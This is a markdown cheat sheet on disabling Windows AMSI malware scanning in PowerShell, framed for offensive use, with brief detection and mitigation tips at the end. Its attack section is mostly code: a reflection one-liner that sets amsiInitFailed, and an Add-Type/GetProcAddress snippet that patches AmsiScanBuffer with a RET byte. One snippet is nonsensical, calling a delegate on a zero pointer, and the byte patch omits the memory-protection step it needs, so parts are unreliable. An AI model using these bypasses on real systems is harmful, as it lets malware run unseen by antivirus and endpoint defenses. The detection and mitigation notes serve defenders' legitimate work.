# 🧪 AMSI Bypass - Kill Script Scanning Stealthily

**AMSI (Antimalware Scan Interface)** is a Windows feature that scans PowerShell and scripting activity in real time. Attackers bypass it by **disabling or patching** the scanning engine at runtime, letting them run payloads without detection.

> ⚠️ Used by nearly all modern red teams and malware toolkits. AMSI is powerful — but also easily neutered.

---

## 🛠️ What It Does
- AMSI inspects PowerShell, VBScript, JavaScript, and macro code
- EDR hooks into `amsi.dll` to analyze content before execution
- Attackers patch AMSI memory space to always return "clean"

---

## 💣 Basic PowerShell AMSI Bypass
### 1. Set `amsiInitFailed` to True (Reflection Trick)
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
  .GetField('amsiInitFailed','NonPublic,Static')
  .SetValue($null,$true)
```
✅ Disables AMSI scanning for the current PowerShell session

---

### 2. Overwrite AMSI Return Value in Memory
```powershell
$mem = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    ([IntPtr]::Zero), [Func[IntPtr,UInt32]]
)
```
Or full byte patch (requires elevated or unmanaged access):
```powershell
$s = '[DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);'
$s += '[DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string name);'
Add-Type -TypeDefinition "using System; using System.Runtime.InteropServices; public class Win32 { $s }"
$ptr = [Win32]::GetProcAddress([Win32]::LoadLibrary("amsi.dll"), "AmsiScanBuffer")
[System.Runtime.InteropServices.Marshal]::Copy([byte[]](0xC3), 0, $ptr, 1)
```
✅ `0xC3` = RET instruction — forces `AmsiScanBuffer` to exit immediately

---

### 3. AMSI Bypass in Payloads
Common in:
- Cobalt Strike
- Empire
- Covenant
- Custom stagers and droppers
✅ They patch AMSI before loading any real payloads

---

## 🕵️‍♂️ Detection Tips
| Indicator | Method |
|-----------|--------|
| Access to `amsi.dll` + `AmsiScanBuffer` | Monitor memory patching behavior |
| Use of `amsiInitFailed` in PowerShell logs | Flag all usage of this field via transcript logs or PowerShell 4104 events |
| Drop in PowerShell telemetry after initial obfuscated command | Suspicious silence often follows successful bypass

---

## 🔐 Mitigation Strategies
- Block PowerShell downgrade attacks (force Constrained Language Mode)
- Monitor memory tampering APIs like `WriteProcessMemory`, `VirtualProtect`
- Use Defender with script block logging + deep inspection enabled
- Hunt for `Add-Type` and `GetProcAddress` patterns in live PowerShell

---

> 🧠 AMSI is your first line of defense — and attackers know it. Kill AMSI, and you silence the alarm. This is **step one in every modern offensive PowerShell op**.
